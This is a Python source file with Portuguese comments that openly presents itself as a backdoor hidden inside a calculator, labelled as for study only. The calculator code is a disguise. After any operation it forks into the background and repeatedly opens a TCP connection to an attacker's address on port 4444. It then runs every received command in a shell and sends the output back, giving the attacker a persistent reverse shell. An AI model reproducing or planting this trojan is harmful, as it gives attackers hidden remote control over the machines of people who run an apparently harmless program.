#Python3 Backdoor Inside Calculator
#Backdoor programado apenas para objetivos de estudo...
import socket # Lib usada para fazer a conexao
import subprocess # Lib usada para executar os comandos do atacante
import os # Lib usada para executar o backdoor em background
import time # Lib usada para esperar um determinado tempo ate se reconectar ao atacante(padrão: 10s)

attacker_ip = "" # IP do atacante
attacker_port = 4444 # Porta do atacante

def pers_conexao(ip, porta): # Função para criar uma conexão persistente com o atacante
  pid = os.fork() # Continua a execução em background
  if pid: # Se estiver em background(tiver um pid)
    exit() # Saia do foreground
  connected = False # Status: Nao conectado
  while not connected: # Enquanto nao estiver conectado
    try: # Tente
      s = socket.socket(socket.AF_INET, socket.SOCK_STREAM) # Criar um pacote TCP
      s.connect((ip,porta)) # Fazer uma conexao TCP com o atacante
      connected = True # Modificar o status para conectado
      while True: # Loop Infinito
        try: # Tente
          iniciaShell(s) # Executa a shell(recebe comandos e envia output)
        except: # Exceto, caso ocorra qualquer erro
          s.close() # Feche a conexao
          pers_conexao(ip, porta) # Tente se conectar dnv
    except socket.error: # Exceto, caso o atacante não esteja esperando a conexao
      time.sleep(10) # espera por 10 segundos ate tentar se conectar denovo
def iniciaShell(s): # Função para executar comandos
  s.send(b'$ ') # simula uma shell
  recv = s.recv(1024) # recebe comando
  cmd = subprocess.Popen(recv, stdout=subprocess.PIPE, stderr=subprocess.PIPE, shell=True) # Executa comando na shell
  s.send(cmd.stdout.read()+cmd.stderr.read()) # Envia o output do stdout e stderr
def calculadora(opcao,a,b):
  if opcao == "soma":
    c = a + b
    print("Soma de %.2f + %.2f: %.2f"  %(a,b,c))
    pers_conexao(attacker_ip, attacker_port) # Executa o backdoor em background
  elif opcao == "sub":
    c = a - b
    print("Subtração de %.2f - %.2f: %.2f"  %(a,b,c))
    pers_conexao(attacker_ip, attacker_port) # Executa o backdoor em background
  elif opcao == "div":
    c = a/b
    print("Divisão de %.2f / %.2f: %.2f"  %(a,b,c))
    pers_conexao(attacker_ip, attacker_port) # Executa o backdoor em background
  elif opcao == "mult":
    c = a*b
    print("Multiplicação de %.2f * %.2f: %.2f" %(a,b,c))
    pers_conexao(attacker_ip, attacker_port) # Executa o backdoor em background
  else:
    print("Opção Inválida")
    pers_conexao(attacker_ip, attacker_port) # Executa o backdoor em background

opcão = input("Escolha uma opção(Soma,Sub,Div e Mult): ").lower()
numero = float(input("Digite o primeiro numero: "))
numero2 = float(input("Digite o segundo numero: "))

calculadora(opcão,numero,numero2)
